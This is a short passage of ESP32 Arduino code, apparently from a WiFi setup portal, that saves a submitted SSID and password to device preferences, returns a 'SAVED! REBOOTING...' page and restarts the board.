  if (s.length() > 0) { preferences.begin("wifi_conf", false); preferences.putString("ssid", s); preferences.putString("pass", p); preferences.end();
    String html = "<html><body style='background-color:#000; color:#0f0; font-family:monospace;'><h1>SAVED! REBOOTING...</h1></body></html>";
    server.send(200, "text/html", html); delay(1000); ESP.restart(); 
  }
}